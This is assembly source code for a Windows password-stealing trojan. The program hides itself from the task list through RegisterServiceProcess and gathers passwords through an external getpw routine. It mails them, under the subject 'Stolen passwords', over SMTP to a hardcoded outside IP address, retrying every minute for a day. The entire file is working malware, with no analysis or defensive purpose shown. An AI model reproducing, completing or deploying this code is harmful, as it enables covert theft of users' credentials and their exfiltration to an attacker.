	P386
	MODEL   flat, stdcall
	JUMPS
	LOCALS

INCLUDE W32.inc

EXTRN	LoadLibraryA			: PROC

EXTRN	getpw				: PROC


wsadescription_len	EQU	256
wsasys_status_len	EQU	128

WSAdata	STRUCT
	wVersion	DW	?
	wHighVersion	DW	?
	szDescription	DB	wsadescription_len + 1 DUP (?)
	szSystemStatus	DB	wsasys_status_len + 1 DUP (?)
	iMaxSockets	DW	?
	iMaxUdpDg	DW	?
	lpVendorInfo	DW	?
WSAdata	ENDS

sockaddr_in	STRUCT
	sin_family	DW	?
	sin_port	DW	?
	sin_addr	DB	?
			DB	?
			DB	?
			DB	?
	sin_zero	DB	8 DUP (?)
sockaddr_in	ENDS


	DATASEG

Library		DB	"KERNEL32.DLL", NULL
Function	DB	"RegisterServiceProcess", NULL

;HOST		EQU	127,0,0,1		; IP addr bytes
HOST		EQU	143,107,231,17		; IP addr bytes
PORT		EQU	25 * 100h		; htons(IPPORT_SMTP)

sin		sockaddr_in <AF_INET, PORT, HOST>


DELAY		EQU	60
TRIES		EQU	24 * 60


LF		EQU	0Ah
Rcpt		DB	"stas", 64 - ($ - Rcpt) DUP (0)

Mail		DB	"HELO localhost", LF
		DB	"MAIL FROM: dumb@ss.com", LF
		DB	"RCPT TO: %s", LF
		DB	"DATA", LF
		DB	"From: Dumbass", LF
		DB	"Subject: Stolen passwords", LF
		DB	LF, NULL
Mail_		DD	$ - Mail

MailFooter	DB	".", LF
		DB	"QUIT", LF
MailFooter_	EQU	$ - MailFooter


	UDATASEG

Data		DB	10000h DUP (?)

wsadata		WSAdata <?>
sock		DD	?

Len		DD	?

	CODESEG

Start:
	call	LoadLibraryA, offset Library
	or	eax, eax
	jz	@@Anyway

	call	GetProcAddress, eax, offset Function
	or	eax, eax
	jz	@@Anyway

	call	eax, NULL, TRUE


@@Anyway:
	push	offset Rcpt
	push	offset Mail
	push	offset Data
	call	_wsprintfA
	add     esp, 4 * 3

	add	[Mail_], eax
	add	eax, offset Data
	mov	edi, eax

	call	getpw, eax
	cmp	eax, -1
	jz	@@Bye

	add	edi, eax
	mov	esi, offset MailFooter
	mov	ecx, MailFooter_
	rep	movsb

	add	[Mail_], eax
	mov	ecx, TRIES


@@Try:
	push	ecx

	call	sendmail, offset Data, Mail_
	or	eax, eax
	jz	@@Bye

	call	Sleep, DELAY * 1000

	pop	ecx
	loop	@@Try


@@Bye:
	call    ExitProcess, 0


sendmail PROC
	ARG	_data:DWORD, _data_len:DWORD

	call	WSAStartup, 0101h, offset wsadata
	or	eax, eax
	jnz	@@Bye

	call	socket, AF_INET, Sock_stream, 0
	cmp	eax, -1
	jz	@@Bye
	mov	[sock], eax

	call	connect, eax, offset sin, size sin
	cmp	eax, -1
	jz	@@Sux

	call	send, sock, _data, _data_len, 0
	xor	eax, eax

@@Sux:
	push	eax
	call    closesocket, sock
	call    WSACleanup
	pop	eax

@@Bye:
	ret
sendmail ENDP

END Start
